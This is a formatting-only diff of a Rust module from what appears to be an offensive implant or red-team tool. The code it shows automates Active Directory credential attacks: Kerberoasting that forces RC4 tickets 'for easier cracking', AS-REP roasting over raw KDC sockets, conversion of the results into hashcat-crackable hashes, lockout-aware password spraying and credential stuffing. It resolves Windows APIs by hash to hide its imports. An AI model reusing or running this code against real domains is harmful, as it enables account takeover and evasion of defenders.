@@ -33,8 +33,8 @@ use std::net::TcpStream;
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
@@ -45,14 +45,14 @@ use super::ad_enum::AdReconData;
 // ═══════════════════════════════════════════════════════════════════════════
 
 const KERBEROS_DLL_W: &[u16] = &[
-    'k' as u16, 'e' as u16, 'r' as u16, 'b' as u16, 'e' as u16, 'r' as u16,
-    'o' as u16, 's' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'k' as u16, 'e' as u16, 'r' as u16, 'b' as u16, 'e' as u16, 'r' as u16, 'o' as u16, 's' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_KERBEROS_DLL: u32 = hash_wstr_const(KERBEROS_DLL_W);
 
 const SECUR32_DLL_W: &[u16] = &[
-    's' as u16, 'e' as u16, 'c' as u16, 'u' as u16, 'r' as u16, '3' as u16,
-    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    's' as u16, 'e' as u16, 'c' as u16, 'u' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16,
+    'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_SECUR32_DLL: u32 = hash_wstr_const(SECUR32_DLL_W);
 
@@ -65,8 +65,8 @@ const FN_LSA_DEREGISTER_LOGON_PROCESS: u32 = hash_str_const(b"LsaDeregisterLogon
 
 // advapi32.dll — LogonUserW for SSPI password validation
 const ADVAPI32_DLL_W: &[u16] = &[
-    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_W);
 const FN_LOGON_USER_W: u32 = hash_str_const(b"LogonUserW");
@@ -74,8 +74,8 @@ const FN_CLOSE_HANDLE: u32 = hash_str_const(b"CloseHandle");
 
 // kernel32.dll for CloseHandle fallback
 const KERNEL32_DLL_W: &[u16] = &[
-    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);
 
@@ -90,11 +90,11 @@ type ULONG = u32;
 const STATUS_SUCCESS: NTSTATUS = 0;
 
 // Kerberos message types
-const KERB_RETRIEVE_TICKET_REQUEST: ULONG = 8;  // KerbRetrieveEncodedTicketMessage
-const KERB_SUBMIT_TKT_REQUEST: ULONG = 14;       // KerbSubmitTicketMessage (unused here)
+const KERB_RETRIEVE_TICKET_REQUEST: ULONG = 8; // KerbRetrieveEncodedTicketMessage
+const KERB_SUBMIT_TKT_REQUEST: ULONG = 14; // KerbSubmitTicketMessage (unused here)
 
 // Encryption types
-const RC4_HMAC: ULONG = 0x17;     // 23
+const RC4_HMAC: ULONG = 0x17; // 23
 const AES256_CTS_HMAC_SHA1_96: ULONG = 0x12; // 18
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -257,9 +257,13 @@ fn der_wrap(tag: u8, data: &[u8]) -> Vec<u8> {
     v
 }
 
-fn der_sequence(data: &[u8]) -> Vec<u8> { der_wrap(0x30, data) }
+fn der_sequence(data: &[u8]) -> Vec<u8> {
+    der_wrap(0x30, data)
+}
 
-fn der_context_explicit(n: u8, data: &[u8]) -> Vec<u8> { der_wrap(0xa0 | n, data) }
+fn der_context_explicit(n: u8, data: &[u8]) -> Vec<u8> {
+    der_wrap(0xa0 | n, data)
+}
 
 fn der_integer_val(n: i64) -> Vec<u8> {
     if n >= 0 && n <= 0x7f {
@@ -274,7 +278,9 @@ fn der_integer_val(n: i64) -> Vec<u8> {
     der_wrap(0x02, &bytes[start..])
 }
 
-fn der_general_string(s: &str) -> Vec<u8> { der_wrap(0x1b, s.as_bytes()) }
+fn der_general_string(s: &str) -> Vec<u8> {
+    der_wrap(0x1b, s.as_bytes())
+}
 
 fn der_bit_string(data: &[u8]) -> Vec<u8> {
     // Prepend unused-bits count (0)
@@ -283,7 +289,9 @@ fn der_bit_string(data: &[u8]) -> Vec<u8> {
     der_wrap(0x03, &v)
 }
 
-fn der_generalized_time(s: &str) -> Vec<u8> { der_wrap(0x18, s.as_bytes()) }
+fn der_generalized_time(s: &str) -> Vec<u8> {
+    der_wrap(0x18, s.as_bytes())
+}
 
 /// Build an AS-REQ without PA-DATA (for AS-REP roasting).
 ///
@@ -341,7 +349,9 @@ fn send_kdc_tcp_raw(dc: &str, port: u16, request: &[u8]) -> Result<Vec<u8>> {
     let timeout = std::time::Duration::from_secs(10);
 
     let mut stream = TcpStream::connect_timeout(
-        &addr.parse().with_context(|| format!("Invalid KDC address: {}", addr))?,
+        &addr
+            .parse()
+            .with_context(|| format!("Invalid KDC address: {}", addr))?,
         timeout,
     )
     .with_context(|| format!("Cannot connect to KDC at {}", addr))?;
@@ -427,8 +437,12 @@ fn extract_asrep_hash(response: &[u8], username: &str, realm: &str) -> Result<St
     }
 
     // Strip APPLICATION 11 wrapper
-    let (app_len, app_lb) = read_der_len(response.get(1..).ok_or_else(|| anyhow!("Truncated AS-REP response"))?)
-        .ok_or_else(|| anyhow!("Cannot read APPLICATION length"))?;
+    let (app_len, app_lb) = read_der_len(
+        response
+            .get(1..)
+            .ok_or_else(|| anyhow!("Truncated AS-REP response"))?,
+    )
+    .ok_or_else(|| anyhow!("Cannot read APPLICATION length"))?;
     let app_inner = response
         .get(1 + app_lb..1 + app_lb + app_len)
         .ok_or_else(|| anyhow!("Truncated AS-REP APPLICATION wrapper"))?;
@@ -437,22 +451,30 @@ fn extract_asrep_hash(response: &[u8], username: &str, realm: &str) -> Result<St
     if app_inner.first() != Some(&0x30) {
         bail!("Expected SEQUENCE inside APPLICATION 11");
     }
-    let (seq_len, seq_lb) = read_der_len(app_inner.get(1..).ok_or_else(|| anyhow!("Truncated AS-REP inner sequence"))?)
-        .ok_or_else(|| anyhow!("Cannot read outer SEQUENCE length"))?;
+    let (seq_len, seq_lb) = read_der_len(
+        app_inner
+            .get(1..)
+            .ok_or_else(|| anyhow!("Truncated AS-REP inner sequence"))?,
+    )
+    .ok_or_else(|| anyhow!("Cannot read outer SEQUENCE length"))?;
     let seq_inner = app_inner
         .get(1 + seq_lb..1 + seq_lb + seq_len)
         .ok_or_else(|| anyhow!("Truncated outer SEQUENCE"))?;
 
     // Find [7] enc-part = context tag 0xa7
-    let enc_part_ctx = der_find_tag(seq_inner, 0xa7)
-        .ok_or_else(|| anyhow!("enc-part [7] not found in AS-REP"))?;
+    let enc_part_ctx =
+        der_find_tag(seq_inner, 0xa7).ok_or_else(|| anyhow!("enc-part [7] not found in AS-REP"))?;
 
     // enc-part is wrapped in a SEQUENCE { EncryptedData }
     if enc_part_ctx.first() != Some(&0x30) {
         bail!("Expected SEQUENCE in enc-part");
     }
-    let (ed_seq_len, ed_seq_lb) = read_der_len(enc_part_ctx.get(1..).ok_or_else(|| anyhow!("Truncated enc-part context"))?)
-        .ok_or_else(|| anyhow!("Cannot read EncryptedData SEQUENCE length"))?;
+    let (ed_seq_len, ed_seq_lb) = read_der_len(
+        enc_part_ctx
+            .get(1..)
+            .ok_or_else(|| anyhow!("Truncated enc-part context"))?,
+    )
+    .ok_or_else(|| anyhow!("Cannot read EncryptedData SEQUENCE length"))?;
     let ed_inner = enc_part_ctx
         .get(1 + ed_seq_lb..1 + ed_seq_lb + ed_seq_len)
         .ok_or_else(|| anyhow!("Truncated EncryptedData SEQUENCE"))?;
@@ -465,23 +487,31 @@ fn extract_asrep_hash(response: &[u8], username: &str, realm: &str) -> Result<St
     if cipher_ctx.first() != Some(&0x04) {
         bail!("Expected OCTET STRING for cipher");
     }
-    let (cs_len, cs_lb) = read_der_len(cipher_ctx.get(1..).ok_or_else(|| anyhow!("Truncated cipher context"))?)
-        .ok_or_else(|| anyhow!("Cannot read cipher OCTET STRING length"))?;
+    let (cs_len, cs_lb) = read_der_len(
+        cipher_ctx
+            .get(1..)
+            .ok_or_else(|| anyhow!("Truncated cipher context"))?,
+    )
+    .ok_or_else(|| anyhow!("Cannot read cipher OCTET STRING length"))?;
     let cipher_bytes = cipher_ctx
         .get(1 + cs_lb..1 + cs_lb + cs_len)
         .ok_or_else(|| anyhow!("Truncated cipher OCTET STRING"))?;
 
     if cipher_bytes.len() < 16 {
-        bail!("Cipher too short for hashcat format: {} bytes", cipher_bytes.len());
+        bail!(
+            "Cipher too short for hashcat format: {} bytes",
+            cipher_bytes.len()
+        );
     }
 
     // hashcat 18200 format: $krb5asrep$23$user@realm:checksum$data
     let checksum = hex::encode(&cipher_bytes[..16]);
     let data = hex::encode(&cipher_bytes[16..]);
-    Ok(format!("$krb5asrep$23${}@{}:{}${}", username, realm, checksum, data))
+    Ok(format!(
+        "$krb5asrep$23${}@{}:{}${}",
+        username, realm, checksum, data
+    ))
 }
-
-
 
 struct LsaHandle {
     handle: HANDLE,
@@ -495,7 +525,9 @@ impl Drop for LsaHandle {
             // Best-effort deregister
             let secur32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_SECUR32_DLL) };
             if let Some(base) = secur32 {
-                if let Some(addr) = unsafe { pe_resolve::get_proc_address_by_hash(base, FN_LSA_DEREGISTER_LOGON_PROCESS) } {
+                if let Some(addr) = unsafe {
+                    pe_resolve::get_proc_address_by_hash(base, FN_LSA_DEREGISTER_LOGON_PROCESS)
+                } {
                     let deregister: unsafe extern "system" fn(HANDLE) -> NTSTATUS =
                         unsafe { mem::transmute(addr) };
                     unsafe { deregister(self.handle) };
@@ -549,9 +581,18 @@ fn get_kerberos_package_id(lsa: &LsaHandle) -> Result<ULONG> {
     };
 
     let mut package_id: ULONG = 0;
-    let status = unsafe { lookup(lsa.handle, &pkg_name as *const LsaString as *mut LsaString, &mut package_id) };
+    let status = unsafe {
+        lookup(
+            lsa.handle,
+            &pkg_name as *const LsaString as *mut LsaString,
+            &mut package_id,
+        )
+    };
     if !nt_success(status) {
-        bail!("LsaLookupAuthenticationPackage failed: 0x{:08X}", status as u32);
+        bail!(
+            "LsaLookupAuthenticationPackage failed: 0x{:08X}",
+            status as u32
+        );
     }
 
     Ok(package_id)
@@ -567,7 +608,13 @@ fn request_tgs_for_spn(lsa: &LsaHandle, package_id: ULONG, spn: &str) -> Result<
         .ok_or_else(|| anyhow!("secur32.dll not found"))?;
 
     let call_auth_pkg: unsafe extern "system" fn(
-        HANDLE, ULONG, *const c_void, ULONG, *mut *mut c_void, *mut ULONG, *mut NTSTATUS,
+        HANDLE,
+        ULONG,
+        *const c_void,
+        ULONG,
+        *mut *mut c_void,
+        *mut ULONG,
+        *mut NTSTATUS,
     ) -> NTSTATUS = unsafe {
         mem::transmute(
             pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_CALL_AUTH_PKG)
@@ -595,7 +642,7 @@ fn request_tgs_for_spn(lsa: &LsaHandle, package_id: ULONG, spn: &str) -> Result<
         logon_id: 0,
         target_name: spn_lsa,
         ticket_flags: 0,
-        cache_options: 0x8, // KERB_RETRIEVE_TICKET_AS_KERB_CRED
+        cache_options: 0x8,        // KERB_RETRIEVE_TICKET_AS_KERB_CRED
         encryption_type: RC4_HMAC, // Prefer RC4 for easier cracking
     };
 
@@ -672,7 +719,10 @@ fn format_kerberoast_hash(
     format!(
         "$krb5tgs${}${}*{}${}${}${}${}",
         enc_num,
-        sam, sam, domain, spn,
+        sam,
+        sam,
+        domain,
+        spn,
         &ticket_hex[..ticket_hex.len().min(32)],
         ticket_hex
     )
@@ -814,7 +864,9 @@ pub fn auto_kerberoast(ad_data: &AdReconData) -> Vec<KerberoastResult> {
 pub fn auto_asrep_roast(ad_data: &AdReconData) -> Vec<AsrepRoastResult> {
     let mut results = Vec::new();
 
-    let roastable_users: Vec<_> = ad_data.users.iter()
+    let roastable_users: Vec<_> = ad_data
+        .users
+        .iter()
         .filter(|u| u.is_asrep_roastable && !u.is_disabled)
         .collect();
 
@@ -873,30 +925,28 @@ pub fn auto_asrep_roast(ad_data: &AdReconData) -> Vec<AsrepRoastResult> {
                     error: format!("KDC connect failed: {}", e),
                 });
             }
-            Ok(response) => {
-                match extract_asrep_hash(&response, sam, domain) {
-                    Ok(hash) => {
-                        info!("AS-REP Roast: extracted hash for {}", sam);
-                        results.push(AsrepRoastResult {
-                            sam_account_name: sam.clone(),
-                            domain: domain.clone(),
-                            hash,
-                            success: true,
-                            error: String::new(),
-                        });
-                    }
-                    Err(e) => {
-                        debug!("AS-REP Roast: parse failed for {}: {}", sam, e);
-                        results.push(AsrepRoastResult {
-                            sam_account_name: sam.clone(),
-                            domain: domain.clone(),
-                            hash: String::new(),
-                            success: false,
-                            error: e.to_string(),
-                        });
-                    }
+            Ok(response) => match extract_asrep_hash(&response, sam, domain) {
+                Ok(hash) => {
+                    info!("AS-REP Roast: extracted hash for {}", sam);
+                    results.push(AsrepRoastResult {
+                        sam_account_name: sam.clone(),
+                        domain: domain.clone(),
+                        hash,
+                        success: true,
+                        error: String::new(),
+                    });
                 }
-            }
+                Err(e) => {
+                    debug!("AS-REP Roast: parse failed for {}: {}", sam, e);
+                    results.push(AsrepRoastResult {
+                        sam_account_name: sam.clone(),
+                        domain: domain.clone(),
+                        hash: String::new(),
+                        success: false,
+                        error: e.to_string(),
+                    });
+                }
+            },
         }
     }
 
@@ -974,9 +1024,17 @@ pub fn password_spray(ad_data: &AdReconData, passwords: &[String]) -> Vec<SprayR
     };
 
     let passwords_to_try: Vec<&str> = if passwords.is_empty() {
-        SPRAY_PASSWORDS.iter().take(safe_count as usize).copied().collect()
+        SPRAY_PASSWORDS
+            .iter()
+            .take(safe_count as usize)
+            .copied()
+            .collect()
     } else {
-        passwords.iter().map(|s| s.as_str()).take(safe_count as usize).collect()
+        passwords
+            .iter()
+            .map(|s| s.as_str())
+            .take(safe_count as usize)
+            .collect()
     };
 
     if passwords_to_try.is_empty() {
@@ -993,7 +1051,9 @@ pub fn password_spray(ad_data: &AdReconData, passwords: &[String]) -> Vec<SprayR
     );
 
     // Target: enabled, non-admin accounts (avoid locking out admins)
-    let targets: Vec<_> = ad_data.users.iter()
+    let targets: Vec<_> = ad_data
+        .users
+        .iter()
         .filter(|u| !u.is_disabled && !u.admin_count)
         .collect();
 
@@ -1136,8 +1196,6 @@ fn try_authenticate(domain: &str, username: &str, password: &str) -> SprayResult
     }
 }
 
-
-
 /// Test a list of known username/password pairs against the domain.
 ///
 /// Unlike password spraying (one password → many accounts), credential
@@ -1164,7 +1222,9 @@ pub fn credential_stuffing(
     }
 
     // Validate usernames against AD data
-    let valid_users: std::collections::HashSet<String> = ad_data.users.iter()
+    let valid_users: std::collections::HashSet<String> = ad_data
+        .users
+        .iter()
         .filter(|u| !u.is_disabled)
         .map(|u| u.sam_account_name.to_ascii_lowercase())
         .collect();
@@ -1235,7 +1295,10 @@ pub fn run_all_credential_attacks(
         0
     };
 
-    info!("Credential attacks: starting all attacks (lockout threshold: {})", lockout_threshold);
+    info!(
+        "Credential attacks: starting all attacks (lockout threshold: {})",
+        lockout_threshold
+    );
 
     let kerberoast_results = auto_kerberoast(ad_data);
     let asrep_roast_results = auto_asrep_roast(ad_data);
@@ -1272,7 +1335,8 @@ mod tests {
                 AdUser {
                     sam_account_name: "svc_mssql".to_string(),
                     display_name: "MSSQL Service".to_string(),
-                    distinguished_name: "CN=svc_mssql,OU=Service Accounts,DC=test,DC=local".to_string(),
+                    distinguished_name: "CN=svc_mssql,OU=Service Accounts,DC=test,DC=local"
+                        .to_string(),
                     member_of: vec![],
                     user_account_control: 0x10200,
                     service_principal_names: vec!["MSSQLSVC/db01.test.local:1433".to_string()],
@@ -1341,7 +1405,13 @@ mod tests {
     #[test]
     fn test_format_kerberoast_hash_rc4() {
         let ticket_data = vec![0xDE, 0xAD, 0xBE, 0xEF];
-        let hash = format_kerberoast_hash("svc_mssql", "test.local", "MSSQLSVC/db01:1433", RC4_HMAC, &ticket_data);
+        let hash = format_kerberoast_hash(
+            "svc_mssql",
+            "test.local",
+            "MSSQLSVC/db01:1433",
+            RC4_HMAC,
+            &ticket_data,
+        );
         assert!(hash.starts_with("$krb5tgs$23$"));
         assert!(hash.contains("svc_mssql"));
     }
@@ -1349,21 +1419,35 @@ mod tests {
     #[test]
     fn test_format_kerberoast_hash_aes() {
         let ticket_data = vec![0x01, 0x02, 0x03, 0x04];
-        let hash = format_kerberoast_hash("svc_mssql", "test.local", "MSSQLSVC/db01:1433", AES256_CTS_HMAC_SHA1_96, &ticket_data);
+        let hash = format_kerberoast_hash(
+            "svc_mssql",
+            "test.local",
+            "MSSQLSVC/db01:1433",
+            AES256_CTS_HMAC_SHA1_96,
+            &ticket_data,
+        );
         assert!(hash.starts_with("$krb5tgs$18$"));
     }
 
     #[test]
     fn test_safe_spray_count_threshold_5() {
         let threshold = 5u32;
-        let safe_count = if threshold > 1 { (threshold - 1).min(5) } else { 0 };
+        let safe_count = if threshold > 1 {
+            (threshold - 1).min(5)
+        } else {
+            0
+        };
         assert_eq!(safe_count, 4);
     }
 
     #[test]
     fn test_safe_spray_count_threshold_1() {
         let threshold = 1u32;
-        let safe_count = if threshold > 1 { (threshold - 1).min(5) } else { 0 };
+        let safe_count = if threshold > 1 {
+            (threshold - 1).min(5)
+        } else {
+            0
+        };
         assert_eq!(safe_count, 0);
     }
 
@@ -1377,14 +1461,20 @@ mod tests {
     #[test]
     fn test_safe_spray_count_threshold_10() {
         let threshold = 10u32;
-        let safe_count = if threshold > 1 { (threshold - 1).min(5) } else { 0 };
+        let safe_count = if threshold > 1 {
+            (threshold - 1).min(5)
+        } else {
+            0
+        };
         assert_eq!(safe_count, 5); // Capped at 5
     }
 
     #[test]
     fn test_asrep_roast_identifies_roastable() {
         let ad_data = make_test_ad_data();
-        let roastable: Vec<_> = ad_data.users.iter()
+        let roastable: Vec<_> = ad_data
+            .users
+            .iter()
             .filter(|u| u.is_asrep_roastable && !u.is_disabled)
             .collect();
         assert_eq!(roastable.len(), 1);
@@ -1401,10 +1491,14 @@ mod tests {
     #[test]
     fn test_password_spray_excludes_disabled() {
         let ad_data = make_test_ad_data();
-        let targets: Vec<_> = ad_data.users.iter()
+        let targets: Vec<_> = ad_data
+            .users
+            .iter()
             .filter(|u| !u.is_disabled && !u.admin_count)
             .collect();
-        assert!(!targets.iter().any(|u| u.sam_account_name == "disabled_user"));
+        assert!(!targets
+            .iter()
+            .any(|u| u.sam_account_name == "disabled_user"));
     }
 
     #[test]
@@ -1488,9 +1582,10 @@ mod tests {
     #[test]
     fn test_credential_stuffing_invalid_user() {
         let ad_data = make_test_ad_data();
-        let results = credential_stuffing(&ad_data, &[
-            ("nonexistent_user".to_string(), "password123".to_string()),
-        ]);
+        let results = credential_stuffing(
+            &ad_data,
+            &[("nonexistent_user".to_string(), "password123".to_string())],
+        );
         assert_eq!(results.len(), 1);
         assert_eq!(results[0].status, "user_not_found");
     }
